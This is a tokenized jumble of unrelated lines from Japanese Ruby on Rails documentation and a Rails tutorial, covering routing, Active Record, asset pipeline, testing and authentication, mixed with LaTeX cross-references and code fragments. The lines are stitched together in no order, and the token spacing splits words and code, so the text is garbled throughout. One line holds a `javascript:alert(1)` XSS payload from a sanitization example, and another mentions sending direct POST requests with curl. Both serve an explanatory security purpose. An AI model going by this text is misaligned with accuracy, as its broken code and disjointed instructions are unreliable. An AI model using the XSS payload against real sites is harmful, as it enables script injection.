▁### ▁ アプリケーションの ホームページ を設定する
▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁The ▁\ k ode { current \_ user ?}
▁ 具体的には 、 レシーバの ハッシュ キー に対して ` to _ sy m ` を送信し ています 。
▁WARNING : ▁ 独自の ` select ` メソッド を使用する場合 には 、 関連付けられている モデルの 主キー カラム と 外部キー カラム を 必ず 含 めて おいてください 。
▁ 無効な データ を送信し た場合 、 ユーザーの カウント が 変 わ らない ことが 期 待 されます ▟ 有効な データを 送信 した 場合には 、 ユーザーの カウント が 1 つ 増え ること が 期 待 されます 。
▁* ▁` asset - url (" rails ▖ png ") ` は ` url ( / assets / rails ▖ png ) ` に変換 される
▁ 開発環境 の コンピュータ に MySQL が インストール されており 、 ユーザー名 root 、 パスワード なしで 接続 できる のであれば 、 上の 設定 で 接続 できる よう になるはずです 。
▁" T r ue Class " ▁=> ▁" boolean ",
▁<%= ▁comment _ counter ▁+ ▁1 ▁%> ▖ ▁<%= ▁comment ▖ text ▁%>
▁ 要 する に \ k ode { create } アクション の中で は 、 ユーザーの 認 証 に必要な あらゆる 情報を \ k ode { params } ハッシュ から 簡単に 取り 出 せる ということです 。
▁ リクエスト で 送信された ` JSON ` ベースの パラメータ が どのように 見え る か を 以下の 表 に示します 。
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ でした が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : feed _ final } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed }) 。
▁` http :// localhost :3000/ blorgh / articles ` を ブラウザで 表示する と 、 生成された デフォルトの scaffold が表示されます 。
▁この リクエスト は ` patients ` コントローラの ` show ` アクション に割り当てられ 、` params ` には ` { ▁id : ▁' 17 ' ▁}` ハッシュ が含まれています 。
▁`: as ` を使用すると 、 ネストした ルーティングヘルパー 内の リソース 用に 自動生成 された 名前 を オーバーライド できます 。
▁リスト \ ref { code : mail _ password _ reset } 、 リスト \ ref { code : password _ reset _ text } 、 リスト \ ref { code : password _ reset _ html } のコード を使用すると 、 正しい メールアドレス を送信し たとき の 画面 は 図 \ ref { fig : valid _ email _ password _ reset } のようになります 。
▁ここで の ね ら い は 、 ブラウザに この base 64 トークン を 保存 しておき 、 データベースに は トークン を 暗号化 したものを 保存 することです 。
▁Ruby ▁on ▁Rails のテスト で 警 告 が ひとつ も 表示 されない のが 理想 ですが 、 サードパーティ の もの も含め て 若 干 の 警 告 が表示され てしまう ことがあります 。
▁2 つ目の 方法は ` find _ in _ batches ` メソッド を使用する 方法 です ▟ レコード の バッチ を 1 つ 取り出し 、 次に ▁ _ バッチ 全体 _ ▁ を モデル の配列 として ブロック に yield します 。
▁Sprockets では 、 どの アセットを インクルード して サポート するか を指定する の に マニフェストファイル を使用します 。
▁# ▁bundle ▁exec ▁rake ▁ doc : rails ▁generates ▁the ▁API ▁under ▁ doc / api ▖
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } ▖ transform _ keys ▁ { ▁| key | ▁key ▖ to _ s ▖ upcase ▁ }
▁`: disabled ` を指定すると 、 Rails で セッション が 扱 わ れ なくなります 。
▁ コマンド の 多 さ に 圧 倒 され が ち ですが 、 すべての コマンドを 今 覚え る 必要 は まったく ありません ので 、 心 配 は 無 用 です 。
▁< li >`: domain ` ▁- ▁H E LO ドメイン を指定する 必要がある 場合は ここで 行なう ▟ </ li >
▁ここでは 動作を す み ず み まで 理解 する必要はありません ▁( 実際 、\ emph { 筆者 } も このコード を ひ と 目 で 完 璧 に 把 握 できる など とは 言い ません )▟ ここで 重要なのは 、 テストコード に \ k ode { do } という キーワード がある ことに 気 付き 、 そこ から テストの 本 体 が 「 そ も そ も ブロック で でき ている 」 ことに気付く ことです 。
▁この節で 提 案 する さまざまな 拡張 ▁( パスワード リ マ イン ダ 、 メール による 確 認 、 サンプルアプリケーション 向 け には 検索 、 返 信 、 メッセージ ング など ) ▁ は 、 ほとんど が Web アプリケーションで 一般的な 機能 です 。
▁* ▁` image - url (" rails ▖ png ") ` は ` url ( / assets / rails ▖ png ) ` に変換 される
▁t ▖ string ▁: comment er
▁Rails ▁development ▁ box を 利用 できない 事 情 がある場合 は 、 Rails ガイド の [ Rails コア 開発環境 の 構 築 方法 ]( development _ dependencies _ install ▖ html ) を ご 覧 ください 。
▁#### ▁ すべての コア 拡張機能 を 読み込む
▁ユーザー登録 では 最初に ユーザー を作成し ましたが 、 ログイン で セッション を作成する 場合に 最初に 行う のは 、 入力 が \ emph { 無効な } 場合 の 処理 です 。
▁この テクニック を 学 んだ ことで 、 基本 となる メールアドレス フォーマット 検証 の テストを書く 準備が整いました 。
▁この 警 告 は \ ref { sec : professional _ grade _ deployment } で 解決 する 予定です ) 。
▁ ユーザーのマイクロポスト 表示 に対するテスト 、 すなわち ユーザー に対する request ▁ spec を作成する ところから始め ましょう 。
▁now ▖ seconds _ since _ midnight ▁# ▁=> ▁7 3 59 6
▁この タグ で 選択 された 項目 は 、 Active ▁Record オブジェクト に マルチ パラメータ として 割り当て 可能な 形式 になります 。
▁#### ▁` instance _ variable _ name s `
▁ システムによっては 、 ソースコード の エラー パス を 追 跡 する 「 スタック ト レ ー ス 」 または 「 バ ッ ク ト レ ー ス 」 と呼ばれる メッセージ が 大 量 に表示される ことがあります ▟ この場合 、 かなり 上に ス ク ロー ル する 必要がある かもしれません 。
▁### ▁PostgreSQL の データ 型 ' json ' と ' h store ' について
▁` id ` 以外に 以下の 2 つ を指定できます 。
▁ この問題 を解決する ために 、\ ref { sec : a _ gravatar _ image } で 最小限 の プロファイル ページ を作成する 予定です 。
▁作成した コードをリスト \ ref { code : utility _ method _ tests } に示します
▁ レイアウト も スタイル も 設定 されていない
▁< option ▁value = "1" ▁select ed =" select ed "> D ▖ ▁H einemeier ▁Hansson </ option >
▁\ k ode { index } アクションに \ k ode {@ users ▁= ▁User ▖ all } という 行 があります ▁({1}{2} 図 2▖1 1 {/2}{/1} の 3 に相当 )▟ これによって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ k ode {@ users } という 変数 に保存 します ▁( 5 )▟ なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と発音します 。
▁Mon , ▁09 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁<% ▁@ books ▖ each ▁do ▁| book | ▁%>
▁ このような 動作 は 、 RSpec で \ k ode { expect } メソッドを \ k ode { to } メソッド または ▁\ k ode { not _ to } メソッドと 組み合わせ て 実現 できます 。
▁config ▖ assets ▖ paths ▁<< ▁Rails ▖ root ▖ join (" lib ", ▁" video play er ", ▁" flash ")
▁上のコードは 、 配信 された メッセージ が き っかり 1 つ である かどうかを確認 します 。
▁class ▁P ar a gr a ph ▁< ▁ActiveRecord :: Base
▁ チェックボックス を追加した モックアップ を 図 \ ref { fig : login _ remember _ me _ mockup } に示します 。
▁ マニュアル など 、 アプリケーションの ドキュメント
▁SQL の ` IN ` 式 を使用して レコードを 検索 したい場合 、 条件 ハッシュ に そのため の配列 を 1 つ 渡す ことができます 。
▁Rails 内 外 の 様々な ミドルウェア を 結合 して 、 完全な Rails の Rack アプリケーションを 作る ために 、` Rails :: Application ` は ` ActionDispatch :: Middleware Stack ` を使用しています 。
▁` c a p t ure ` メソッドを使用することで 、 テンプレート の一部 を 変数 に保存 することができます 。
▁この オブジェクトは 、 渡された 属性 を使用して インスタンス化され 、 そのオブジェクト の 外部キー を 介 して リンク が設定され ます ▟ そして 、 関連付けられた モデル で指定されている 検証 がすべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁=> ▁#< StaticPages Controller : 0 x 2 28 55 d 0 >
▁これにより 、 クライアント コード で 以下のような ダ ッ ク タ イ ピ ング チェック を 行なうことができます 。
▁* ▁` config ▖ assets ▖ en able d ` は 、 アセットパイプライン を有効に する かどうかを指定します 。
▁今度は ` app / controllers / comments _ controller ▖ rb ` の ` create ` アクションを 改造 しましょう 。
▁ただし この Gem は 将来 使 え な くなる かもしれません 。
▁xml ▖ p (@ person ▖ b io )
▁< div ▁id =" content "> <%= ▁content _ for ?( : content ) ▁?
▁ //= ▁require ▁ projects
▁この エラーメッセージ に よ れば 、「 指定された アクション / コントローラの 組み合わせ に 一致する ルーティング が 見当たらない 」 と あります ▟ つまり ルーティング ファイル を修正する 必要がある ということです 。
▁次に 、 新しく 定義された 名前付きルート を使って 、 Home ページの ボタン に 適切な リンクを 追加 す 。
▁(\ ref { sec : a _ test _ for _ valid _ submission } で 書く テスト でも 、 ここ で生成した ファイル を使います )
▁Gemfile の内容は Ruby のコード ですが 、 ここでは 文法 を 気にする必要はありません ▟ Ruby の詳細については 第 \ ref { cha : rails _ flavored _ ruby } 章 で説明します 。
▁xml ▖ language ▁" en - us "
▁ レシーバ が ` con ve r t _ key ` に応答する 場合 、 キー は 正 規 化 されます 。
▁ フォローする 相手 を見つけ る
▁リスト \ ref { code : from _ users _ followed _ by _ second _ cut } で コードを 若 干 修正 し 、 フィード を リファクタリング することから始め ましょう 。
▁これで 1 つの 問題 が 解決 されました が 、 メールアドレス の 一意性 を 保 証 するためには 、 もう 1 つ や ら なければならない ことがあります 。
▁DELETE ▁ / photos / 17
▁ 重複 を 取り除く テクニック の 一 つ として 、 ビューで \ emph { 埋め込み Ruby } ▁( Embedded ▁Ruby ) ▁ を使用できます 。
▁1 つの ルーティング について 以下の 情報 が表示されます 。
▁Help ページ についても 、 Home ページ の例 を参考に して 、 同じ ような テスト と アプリケーションコード を 使用できる ことが 推 測 できます 。
▁という の も 、 このコード は 送信 フォーム を使った 投 稿 は 制限 でき ても 、 イン ス ペ ク ター 画面 で JavaScript を い じ って 投 稿 したり 、\ text tt { curl } など を使って 直接 \ k ode { POST } リクエストを送信する 場合には 制限 できない からです 。
▁上の コマンド により 、 Cucumber 関連の ファイルが 置かれ る \ k ode { feature s / } ディレクトリ が 作成されます 。
▁ 以下 に 例 を示します 。
▁User の データモデル の ス ケ ッ チ
▁ただし 、 チェックボックス が 正常に 動作 するためには 、 以下のように ラベル の \ emph { 内 側 } に 配置 する必要があります 。
▁ いずれ の場合 において も 、\ k ode { root } メソッドを使って ルート URL ▁"/ " ▁ を コントローラ ー の アクションに 紐 付け ていました 。
▁( 緑色 の ウ ェ ル カ ム メッセージ は 、\ ref { sec : the _ flash } で 解説 する ▁\ emph { flash } という 機能 を使用して 表示 しています ) 。
▁render ▁file : ▁"/ u / app s / w a re h ous e _ app / current / app / views / products / show "
▁{0} 図 7▖2 2 {/0} ▁{1} ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される {/1}
▁{0}{1} 第 8 章 {/1}{/0} で 認証システムを 構 築 した ことで 、 認可 のための システム を実装する 準備 も で きました 。
▁ これを行うには 、 Rails で \ k ode { form _ for } ヘルパーメソッド を使用します ▟ このメソッドは Active ▁Record オブジェクトを 取り 込 み 、 オブジェクトの 属性 を使用して フォーム を 構成 します 。
▁| ▁| ▁30 3 ▁| ▁: see _ other ▁|
▁従って 、` resource ▁: photo ` と ` resources ▁: photos ` の どちらも 、 単数形 ルーティング と 複数形 ルーティング を 両方 作成し 、 同 一 の コントローラ ▁( ` PhotosController ` ) ▁ に割り当てられ ます 。
▁`: action ` と `: id ` が 必 須 パラメータ ではない ことが かっこ ▁( ) ▁ で 示 されているので 、 この ルーティング は ` / photos ` を ` PhotosController # index ` に ルーティング することもできます 。
▁ 信 じ ら れ ない かもしれませんが 、 必要な 準備 はすべて 終 わ っている ので 、 実装 は わずか 1 行 で 終わり ます 。
▁{0} 図 9 ▖4{/0}{1} \ href { http :// gravatar ▖ com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// michael hartl ▖ com /}{ 誰 か さ ん }) {/1} 。
▁リスト \ ref { code : demo _ length _ validation } のコードは 、 これで 本当に 動作する のか と 思える かもしれませんが 、 ちゃんと 動作します ▁( 検証 機能 については \ ref { sec : user _ validations } で さらに 詳 しく 説明します )▟ 14 1 文字 以上の 新規 マイクロポストを 投 稿 してみ れば わかります 。
▁* ▁` config ▖ active _ support ▖ use _ standard _ json _ time _ format ` は 、 IS O ▁ 8 60 1 フォーマット に 従 った 日付 の シリアライズ を行なう かどうかを指定します 。
▁ 戻り値 は 新しい ノード です 。
▁date ▖ years _ ago (10) ▁# ▁=> ▁We d , ▁ 07 ▁Jun ▁2000
▁続いて 、 Bitbucket に プッシュ します 。
▁Action ▁View および Action ▁Controller は 、 Action ▁Pack を構成する 2 大 要素 です 。
▁create _ table ▁: picture s ▁do ▁| t |
▁` Range # include ?` メソッドと ` Range # = == ` メソッドは 、 与えられた インスタンス の 範囲 内に 値が 収 ま っている かどうかをチェックします 。
▁Rails は ▁( 必要に応じて ) ▁ 低 級 な SQL クエリ を呼び出す ことができる
▁この 要素 は 、 ブロック から 返 された 値 によって インデックス 化 されます 。
▁belongs _ to ▁: supplier ,
▁上の コマンドで は \ k ode { password _ digest : string } という 引数 を与え て 、 今回 必要 になる 属性 名 と 型 情報を 渡 しています 。
▁ 筆者 は リスト \ ref { code : authenticated _ p _ fixed } のように 明示的に return する 方が 、 コードが 若 干 短 くなる ことも あって 好 み です 。
▁### ▁ 独自の 圧縮 機能 を使用する
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ admin _ 3 r d _ edition } のようになります 。
▁リスト \ ref { code : user _ show _ microposts } のマイクロポスト のコード と 比 較 してみましょう ▟ あのときは 次のように 書き ました 。
▁最後に 、 Heroku へ デプロイ します 。
▁Active ▁Record は 、 これらの 双 方 向 関連付け 同士 に つながり がある ことを デフォルトでは 認 識 しません 。
▁さらに 、` to do s ` テーブル では ` users ` テーブルの ` id ` カラム の値 ではなく ` guid ` カラム の値 を保持し たい とします 。
▁Rails には 、 コマンドラインで 実行 できる コマンド が 多数 付 属 しています 。
▁WARNING : ▁` DateTime ` は 夏 時間 ▁( D ST ) ▁ を 考 慮 しません ▟ 算 出 された 時間 が 最終的に 存在しない 時間 になって も 警 告 や エラー は 発生 しません 。
▁リスト \ ref { code : password _ reset _ edit _ action } の ▁\ k ode { edit } アクション に対応する ▁\ k ode { update } アクション を定義する には 、 4 通り の場合 分 け に対応する 必要があります : ▁ パスワード再設定の 期 限 が 切 れ ている 場合 、 更新 に成功した場合 、 更新 が 失敗した場合 ▁( パスワード が正しく ない など ) 、 更新 が 失敗した場合 ▁( 一見 更新 が成功した ように 見え る が パスワードが 2 つ とも 空欄 ) ▁ です 。
▁リスト \ ref { code : delete _ link _ integration _ test } では 各 ユーザーの 削除リンク をテストする ときに 、 ユーザーが 管理者 であれば スキップ している 点 にも 注 目 してください ▁( これはリスト \ ref { code : delete _ links } により 、 管理者 であれば 削除リンク が表示され ない からです ) 。
▁これらの 概念 については この章 で すべて 説明します 。
▁ 今後 のバージョン では 、` render ▁: text ` は 非推奨 に される 予定です 。
▁ パスワード 再設定 用 メイラー メソッド のテスト を追加する
▁| ▁test / models / comment _ test ▖ rb ▁| ▁ Comment モデル をテストする ための ハ ー ネ ス ▁|
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁photos # destroy ▁| ▁ 特定の 写 真 を削除する ▁|
▁続いて 、 最新の 変更 の ト ッ プ に パッチ を再度 適用 しましょう 。
▁Active ▁Record には 、 単 一 の オブジェクトを 取り出す ための さ ま ざ ま 方法 が 用意されています 。
▁* ▁Rails ▁4▖0 では 、` ParamsParser ` が リクエスト パラメータを パ ー ス でき なかった場合 に 一般的な ` ActionDispatch :: ParamsParser :: P ar se Error ` 例外 が発生する ようになりました 。
▁ 書き込み 対象 ファイル 既に が存在する 場合 、` atomic _ write ` は それ を上書き して オーナー と パ ー ミ ッ ション を保持し ます 。
▁ 章 の 最後に 、 ユーザーを サイトに ログイン させるため の 重要な 一 歩 を 踏 み 出 します 。
▁` index _ by ` メソッドは 、 何らかの キー によって インデックス 化 された enumerable の 要素 を持つ ハッシュ を生成します 。
▁` atomic _ write ` は 、 処理を 完了 するために 一時 的な ファイル を作成します 。
▁ この問題 を避けるために 、 今回は 「 データベースに保存 される 直前に すべての 文字列を 小文字 に変換 する 」 という 対策 を 採 ります ▟ 例えば “ Foo @ E x A M P le ▖ Co M ” という 文字列 が与えられ たら 、 保存 する 直前に “ foo @ example ▖ com ” に変換 してしまいます 。
▁` find _ or _ create _ by ` は 、 既に ある レコード か 新しい レコード のいずれか を返します 。
▁ 動作 の詳細 を知り たい場合は 、 Stack ▁Overflow の \ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { } Rails 信 頼 性 トークン 関連の 書き込み { / 0 ▁( 英語 ) ▁ を参照してください 。
▁Heroku に 新しい アプリケーション を作成する 。
▁ これはリスト \ ref { code : wrap } で使用されていました 。
▁create ▁app / assets / stylesheets / blorgh / comments ▖ css
▁# ▁=> ▁< input ▁id =" email " ▁name =" email " ▁type =" email " ▁/>
▁$ ▁git ▁remote ▁add ▁m in e ▁git @ github ▖ com : < 自分の ユーザー名 > / rails ▖ git
▁上の コマンドで は 、 データベースから users テーブル を削除する ために \ k ode { drop _ table } コマンドを 内部で 呼び出し ています 。
▁### ▁ モデル 同士 を 関連付け る
▁# ▁git ▁config ▁-- global ▁ core ▖ exclude s file ▁' ~ / ▖ gitignore _ global '
▁use ▁ ActionDispatch :: Session :: CookieStore
▁ 登録 された 名前空間 は 、 必ず ` eager _ load !` メソッドに 応答 し なければなりません 。
▁\ k ode { followers } に対するテスト
▁ _ 他の ヘッダー フィールド で ユーザー 入力 を使用する場合 には 、 CRLF の エスケープ を 自分で 実装 すること を 忘れ ない ようにしてください 。
▁ 修正 結果 は以下のようになります 。
▁\ k ode { home } アクションに フィード の インスタンス変数 を追加する
▁これにより 、` set _ author ` 用の 上のコード は以下のようになります 。
▁ アプリ 名を あえて 具体的に していない こと から わかるように 、\ emph { Ruby ▁on ▁Rails チュートリアル } で 開発 する アプリケーションでは 、 特定の Web サービス に 偏 らない 一般的な 記 述 を 心 が け ており 、 読者 の 目的 にかかわらず 本チュートリアル で Web 開発 の基礎 を学ぶ ことができます ▟ とは 言 う もの の 、 最終的な サンプルアプリケーション は ▁( 初期 は Rails で 実装 されて いた ) ▁\ href { http :// twitter ▖ com /}{ 某 ソーシャル マ イ ク ロ ブログ サイト } と 「 偶 然 にも 」 と ても よく 似 ています が 。
▁ そして 、 Ruby ▁( C 、 C + + 、 Perl 、 P y th on 、 Java ) ▁ などの 多くの プログラミング言語 では 、 以下のような 短縮 形 を使用して 上の 演 算 を行う ことができます 。
▁ これはリスト \ ref { code : micropost _ user _ id _ validation } で使用されていました 。
▁これで comments 用の ネストした ルーティング が作成され ました ▟ これが 上の フォーム で 必要 となります 。
▁#### ▁select _ tag
▁最初に \ href { http :// api ▖ heroku ▖ com / signup } { Heroku の ユーザー登録 } を行います ▟ アカウント 作成 後に 完了 通知 メール が 届 い たら 、\ href { https :// t oolbelt ▖ heroku ▖ com /}{ Heroku ▁T oolbelt } を使用して 必要な Heroku ソフトウェア をインストール します
▁person ▖ valid ?
▁次に 、\ k ode { password } 属性 と \ k ode { password _ confirmation } 属性 を追加し 、 パスワード が存在する ことを 要求 し 、 パスワード と パスワード の 確 認 が 一致する ことを 要求 し 、 さらに \ k ode { authenticate } メソッドを使用して 、 暗号化 された パスワード と \ k ode { password _ digest } を 比 較 して ユーザーを 認 証 する という 多くの 手順 が必要です 。
▁Heroku に は既に ImageMagick が インストール されているので 、( 設定 が うまく い っ ていれば ) ▁ 画像 リ サイズ や 本番 での 画像アップロード も 成功 します ▟ 次の 図 \ ref { fig : image _ upload _ production } の ようになってい れば 成功 です 。
▁ 最後の 例 を見ると 、 未 定義 の ハッシュ 値は 単 純 に \ k ode { nil } である ことがわかります 。
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb ▁\ ╼ > ▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁このオプション が 無 指定 の場合は 、 デフォルトの true が 指定 されます 。
▁Rails の 統合テスト では 、 上の ステップ を コード に 落とし 込 んで い く ことになります ▁( リスト \ ref { code : layout _ links _ test })▟ 具体的には 、 まず \ k ode { assert \_ template } メソッドを使って 、 Home ページ が 正しい ビューを 描画 している かどうか 確かめ ます
▁* ▁[ Rails c a st ▁on ▁Rack ▁ Middleware s ]( http :// r ailscasts ▖ com / episodes /1 51 - rack - middleware )
▁ 一度 正しい 関連付けを 定義 して しま えば 、\ k ode {@ micropost } 変数 の \ k ode { user _ id } には 、 関連する ユーザ の id が自動的に 設定 されます 。
▁object ▖ class _ eval ▁do
▁ リファクタリング の 第 一 歩 は 、 リスト { p 0} の ユーザーの {2} li {/2} を {2} render {/2} 呼び出し に置き換える ことです ▁( リスト \ ref { code : index _ view _ first _ refactoring }) 。
▁ データベースの インデックス も 本質的に は 本 の 索 引 と同じように 動作します 。
▁</ body >
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / conversions ▖ rb ` です 。
▁\ k ode { count } メソッドは 、 関連付けを \ emph { 経 由 して } 使用している ことに注目してください 。
▁この bundle ▁install コマンド の 意味 については \ ref { sec : bundler } の 最 初 で 詳 しく ご 説明します 。
▁Ruby では \ k ode { class } という キーワード を使って クラス を定義する
▁ 幸 い 、 はじめ の 一 歩 は 簡単です ▟ Sessions コントローラの \ k ode { create } アクションは すぐ でき あ が ります 。
▁` save ` メソッド を呼ぶ ことで 、 オブジェクトは 適切な データベースの テーブルに 保存されます 。
▁ RedCloth ▁gem を ` Gemfile ` に 追 記 して ` bundle ▁install ` を実行する ことで 利用 できるようになります 。
▁上の 例 を実行すると メッセージ ボックス が表示されます 。
▁Sprockets は 、 production 環境では 前述の フィンガープリント による ス キー ム を使用します 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁equal ▁to ▁% { count } " _ ▁ です 。
▁### ▁ 複数の リソース を 同時に 定義 する
▁format ▖ html
▁ リソースフルな ルーティング を 宣言 することで 、 コントローラの ` index `、` show `、` new `、` edit `、` create `、` update `、` destroy ` アクションを 個 別 に 宣言 し なくても 1 行 で 宣言 が完了し ます 。
▁#### ▁fields _ for
▁ユーザー を表示する ために 、 標準的な Rails の 場所 を使用する ことにします ▟\ k ode { app / views / users / show ▖ html ▖ erb } です 。
▁=> ▁" production "
▁<%= ▁stylesheet _ link _ tag ▁" http :// example ▖ com / main ▖ css " ▁%>
▁Ruby が インストール され ていれば 、 RubyGems は 簡単に インストール できます 。
▁ サインイン フォーム のコード 。
▁ここまで で マイクロポスト に関する 基本的な 操作 はすべて 実装 で きました ▟ この節 では 、 応用 編 として 画像 付き マイクロポストを 投 稿 できるように してみます ▟ N o w ▁that ▁we ’ ve ▁added ▁support ▁for ▁all ▁relevant ▁micropost ▁actions , ▁in ▁this ▁we ’ ll ▁make ▁it ▁ po
▁ 概 要 : ▁ 部品 を 組み 上 げ る
▁HTTP /1▖1 ▁20 1 ▁Create d
▁# ▁=> ▁ { : c => 3 , ▁: a =>1 }
▁これらの テストを まとめ た 結果を 、 リスト \ ref { code : follow _ button _ tests } に示します 。
▁ RedCloth ▖ new (" < a ▁ href =' javascript : alert (1) ' > hello </ a > ", ▁ [: filter _ html ]) ▖ to _ html
▁今回の場合 は 、 ユーザー コントローラの コンテキスト において 、\ emph { マイクロポスト } を ページネーション したい ため 、 明示的に \ k ode {@ microposts } 変数 を \ k ode { ▁will _ paginate } に 渡す 必要があります 。
▁ サーバー ログ に 表示 された パスワード 再設定 メールの 例
▁{0} 図 12 ▖ 7 {/0} ▁{1} 能動的関係 を と お して フォローしているユーザー を取得する 模 式 図 {/1}
▁この 値 を変更する と 、 すべての アセット ファイルが 強制的に リ コンパイル されます 。
▁リスト { p 0} で {2} image _ tag {/2} ヘルパー を使っている ので 、 Rails は 該当する 画像ファイル を 、 アセットパイプライン を通して {2} app / assets / images / {/2} ディレクトリ の中から 探 してくれます ▁( アセットパイプライン については \ ref { sec : sass _ and _ the _ asset _ pipeline } で説明します ) 。
▁ 前 章で お 見 せ した とおり 、 Ruby の基礎 知識 が まったく ない 状態 で あった にもかかわらず Rails アプリケーションの 骨 組み を 作り 上 げ 、 さらに テスト まで 行う ことができ ました 。
▁` rails ▁server ` を実行して Rails を 起動 すること 、` http :// localhost :3000/ blog ` にアクセス できるようになります 。
▁この 開発 手法 に 慣 れる まで には 多少 時間がかかる かもしれませんが 、 一度 慣 れ て しま えば 大きな メ リ ッ ト を 得られます 。
▁Rails が 新規 アプリケーション 用に 生成する ` Gemfile ` には ` therubyracer ` という gem が コメントアウト された 状態 で 含 まれ ており 、 必要であれば この gem の コメントアウト を 解除 して 有効 に することもできます 。
▁`: in ` オプション には `: with in ` という エイリアス も あり 、 好 み に応じて どちら で も使用できます 。
▁microposts
▁xml ▖ tt l ▁" 4 0 "
▁def ▁ summary
▁module _ path ▁= ▁module _ name ▖ underscore
▁ テストの 改 善 方法 について 、 いくつかの 例 を見てみましょう 。
▁#### ▁ datetime _ select
▁ マイクロポストを ユーザ と 関連付け て 構 築 でき ても 、\ k ode { user _ id } にアクセス でき てしまう という セキュリティ上の 問題 は 解決 されません 。
▁Web アプリケーションが 実際に 動作 している ところ を確認する には 、 ブラウザ を開いて ▁< http :// localhost : 3 000 > ▁ を表示し てください 。
▁``` m ar k d own
▁デフォルトは ` / assets ` です 。
▁ 検証 の詳細については [ Active ▁Record 検証 ガイド ]( active _ record _ validations ▖ html ) を参照してください 。
▁ エンジンの 機能を 改良 する
▁redirect _ to ▁articles _ path
▁Blorgh :: Article ▖ class _ eval ▁do
▁$ ▁ ruby ▁- v
▁* ▁` add _ to _ prepare _ block s `: ▁ アプリケーション や railties や エンジンの すべての ` config ▖ to _ prepare ` 呼び出し における ブロック が 、 Action ▁Dispatch の ` to _ prepare ` に追加されます ▟ Action ▁Dispatch は development モードでは リクエスト ごとに 実行 され 、 production モードでは 最初の リクエスト より 前に 実行されます 。
▁$ ▁bin / rake ▁db : migrate
▁ 表示 したい ユーザー リスト があり 、 その ページに 新規ユーザー を作成する フォーム も 置 き たい とします 。
▁following
▁` beginning _ of _ hour ` は ` at _ beginning _ of _ hour ` の別名 です 。
▁この メール は サーバー ログ では リスト \ ref { code : password _ reset _ email } のように 表示されます 。
▁これ を参考に 、\ k ode { _ micropost ▖ html ▖ erb } パーシャル を使って マイクロポストの コレクション を 表示 しようとすると 、 次のようになります 。
▁#### ▁` except ` と ` except !
▁ 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 という文字 が 3 つの タイトル で 繰り返し 使われ ている 。
▁def ▁ compress ( string )
▁上のコード で ご 注 目 い ただ き たい のは 、「 設定 より 規 約 」 の 原 則 が 利 い ている おかげで index アクション の最後 で 明示的に 画面 出力 を 指示 する必要が ない という 点 です 。
▁なお 、\ ref { sec : deleting _ users } では サンプルアプリケーション に ユーザーを削除する 機能を実装し 、 管理 権限 ▁( admin ) ▁ を持つ ユーザー 以外 は 削除 を 実行 できない ように 制限 を かけ ます 。
▁ 今のうちに 、 正しい `: plain `、`: html `、`: body ` オプション に切り替え てください 。
▁` production ▖ rb ` の場合 。
▁% ▁subsection ▁ css _ revisited ▁( end )╼╼ ▁% ▁section ▁other _ data _ structure s ▁( end )╼╼ ▁\ section { Ruby ▁ における クラス } ▁% ▁( fold )╼ ▁\ label { sec : ruby _ classes }╼╼
▁( なお 、 エラーメッセージ に対するテスト は \ ref { sec : exercises _ a _ test _ for _ invalid _ submission } の演習 に 残しておきます ▟)
▁次の コード では 空の example \_ user を作成します ▟ 次に 、 対応する 属性 に それぞれ 手動で 値を 代入 することで 、 名前とメールアドレス を与え ます ▁( リスト \ ref { code : example _ user } で \ k ode { attr \_ accessor } を使用している ので 、 ア ト リ ビュー ト ア ク セ サ を使用して 代入 できます ) 。
▁" hello "▖ at (0) ▁# ▁=> ▁" h "
▁--------------
▁これらの フック の イベント を定義する には 、` Rails :: Application `、` Rails :: Railtie ` 、 または ` Rails :: Engine ` サブクラス 内で ブロック 記 法 を使用します 。
▁この 方法 では 、 レコードが オ ー プ ン されて から 変更 された こと があるかどうかをチェック します 。
▁Rails では 、 モデル 間 の 多 対 多 リレーションシップ を 宣言 するのに 2 とおり の 方法 が 使用できます 。
▁format ▖ html ▁ { ▁redirect _ to ▁@ user , ▁notice : ▁' User ▁was ▁successfully ▁created ▖ '
▁Rails サーバー では console のデフォルトの 環境 として \ text tt { development } が使用されます が 、 以下のように 他の 環境で console を実行する こともできます 。
▁以上で 、 ユーザー一覧ページ は 図 \ ref { fig : user _ index _ pagination } のように 動作する はずです
▁という Hello アプリケーションの コード ▁( リスト \ ref { code : hello _ root _ route }) です ▟ 2 つ目は
▁has _ one 関連付けの 図 ]( images / has _ one ▖ png )
▁ アプリケーションの 動作 は 、 エンジン を 単 体 で 動 か している とき と同じ である ことに気付く ことでしょう 。
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Request ` の導入に伴い ` ActionController :: Request ` が 非推奨 となり ました 。
▁以下の モデル で説明します 。
▁この メソッドを使用して 、 複数の オブジェクト への クエリ を作成する こともできます 。
▁たとえば Action ▁Pack では 、 特定の セッション スト ア を 提供する クラスを 読み込む の に このメソッド を使用しています 。
▁ バージョン 3▖0 ▖ 4 の例 を以下に示します 。
▁( ハッシュの \ k ode { : success } キー は シンボル である 点 に注目し てください ▟ Ruby は シンボル を自動的に ▁\ k ode {" success "} ▁という 文字列に変換 してから テンプレート に 挿 入 します ▟)
▁`: in ` オプション には `: with in ` という エイリアス も あり 、 好 み に応じて どちら で も使用できます 。
▁ ╼\ end { equ ation }
